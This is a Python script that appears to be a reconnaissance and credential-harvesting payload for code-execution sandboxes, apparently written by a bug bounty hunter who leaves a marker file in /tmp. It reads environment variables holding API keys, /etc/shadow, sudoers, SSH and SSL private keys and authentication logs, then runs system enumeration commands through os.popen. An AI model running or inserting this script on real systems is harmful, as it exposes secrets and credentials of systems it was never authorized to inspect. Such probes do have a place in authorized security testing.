# System and process information
print(open('/proc/cpuinfo').read())  # CPU information
print(open('/proc/meminfo').read())  # Memory information
print(open('/proc/uptime').read())  # System uptime
print(open('/proc/version').read())  # Kernel version
print(open('/proc/stat').read())  # System statistics
print(open('/proc/self/status').read())  # Process status

# Process-related files
print(open('/proc/self/cgroup').read())  # Process control group info
print(open('/proc/self/environ').read())  # Process environment variables (API keys, etc.)
print(open('/proc/self/io').read())  # I/O statistics for the process
print(open('/proc/self/fd').read())  # File descriptors for the process

# Filesystem-related files
print(open('/etc/fstab').read())  # Filesystem table (mount points)
print(open('/etc/hostname').read())  # System hostname
print(open('/etc/network/interfaces').read())  # Network interface configuration
print(open('/etc/mtab').read())  # Current mounted filesystems
print(open('/proc/mounts').read())  # Mounted filesystems
print(open('/etc/exports').read())  # NFS file exports

# User and group information
print(open('/etc/passwd').read())  # User account information (login names, home directories, etc.)
print(open('/etc/shadow').read())  # Shadow file containing encrypted password hashes (if accessible)
print(open('/etc/group').read())  # Group information

# Authentication-related files
print(open('/var/log/auth.log').read())  # Authentication logs
print(open('/var/log/secure').read())  # Security logs (permission denied expected)
print(open('/var/log/syslog').read())  # System logs
print(open('/var/log/messages').read())  # System log messages

# Cron and job scheduling files
print(open('/etc/cron.d').read())  # Cron job configuration files
print(open('/etc/cron.daily').read())  # Daily cron jobs directory
print(open('/etc/cron.hourly').read())  # Hourly cron jobs directory
print(open('/etc/cron.monthly').read())  # Monthly cron jobs directory
print(open('/etc/cron.weekly').read())  # Weekly cron jobs directory

# System configuration files
print(open('/etc/sudoers').read())  # Sudoers file (privileges and escalation rights)
print(open('/etc/ssl/certs/ca-certificates.crt').read())  # SSL certificates (if accessible)
print(open('/etc/ssl/private/ssl-cert-snakeoil.key').read())  # SSL private key (if accessible)

# SSH configuration and keys
print(open('/root/.ssh/authorized_keys').read())  # Root's SSH authorized keys
print(open('/home/user/.ssh/id_rsa').read())  # User's RSA private key (if accessible)
print(open('/home/user/.ssh/id_dsa').read())  # User's DSA private key (if accessible)
print(open('/home/user/.ssh/id_ecdsa').read())  # User's ECDSA private key (if accessible)
print(open('/home/user/.ssh/config').read())  # SSH config file

# Web server files
print(open('/var/www/html/index.html').read())  # Web server index file (if accessible)
print(open('/etc/apache2/sites-available/000-default.conf').read())  # Apache default config
print(open('/etc/nginx/sites-available/default').read())  # Nginx default config

# File system logs
print(open('/var/log/dmesg').read())  # Boot and system logs
print(open('/var/log/kern.log').read())  # Kernel logs
print(open('/var/log/user.log').read())  # User-level logs

# Kernel module and system information
print(open('/proc/modules').read())  # Loaded kernel modules
print(open('/proc/interrupts').read())  # Interrupts statistics
print(open('/proc/ioports').read())  # IO port usage
print(open('/proc/devices').read())  # List of devices

# System status and system info
print(open('/etc/timezone').read())  # System timezone
print(open('/etc/resolv.conf').read())  # DNS resolver configuration
print(open('/proc/loadavg').read())  # System load average

# Network-related files
print(open('/etc/hosts').read())  # Local DNS resolution

# System configuration
print(open('/etc/sudoers.d').read())  # Additional sudoers config directory
print(open('/etc/issue').read())  # System identification string

open('/tmp/bug-bounty-hunter.txt', 'w').write('B1scuit Ethical hacker is here')
print(open('/tmp/bug-bounty-hunter.txt').read())



import os

# User and system information
print(os.popen('whoami').read())  # Current logged-in user
print(os.popen('hostname').read())  # System hostname
print(os.popen('uptime').read())  # System uptime

# Network-related commands
print(os.popen('ifconfig').read())  # Network interfaces and their configurations
print(os.popen('netstat -tuln').read())  # Network connections
print(os.popen('ping -c 4 8.8.8.8').read())  # Ping Google DNS server

# Disk and filesystem information
print(os.popen('df -h').read())  # Disk usage information
print(os.popen('du -sh /path/to/directory').read())  # Disk usage for a specific directory
print(os.popen('lsblk').read())  # List block devices

# Process and system monitoring
print(os.popen('ps aux').read())  # List all running processes
print(os.popen('top -n 1').read())  # Show system resource usage (one iteration)
print(os.popen('free -h').read())  # Memory usage

# System logs and configurations
print(os.popen('dmesg').read())  # Kernel ring buffer messages
print(os.popen('journalctl').read())  # View systemd logs (if using systemd)
print(os.popen('cat /var/log/syslog').read())  # System logs

# Package management (Debian-based systems)
print(os.popen('apt list --installed').read())  # List installed packages
print(os.popen('dpkg -l').read())  # Detailed list of installed packages

# Web server commands (Apache)
print(os.popen('apache2ctl -S').read())  # Apache server status and configuration
print(os.popen('systemctl status apache2').read())  # Check Apache service status

# SSH and security commands
print(os.popen('sshd -T').read())  # Check SSH server configuration
print(os.popen('sudo lsof -i -n -P').read())  # List open network connections

# File system and user commands
print(os.popen('ls -l /etc/').read())  # List files in the /etc directory
print(os.popen('chmod 755 /path/to/file').read())  # Change file permissions
print(os.popen('chown user:user /path/to/file').read())  # Change file ownership

# System information
print(os.popen('uname -r').read())  # Kernel version
print(os.popen('cat /proc/cpuinfo').read())  # CPU information
print(os.popen('cat /proc/meminfo').read())  # Memory information
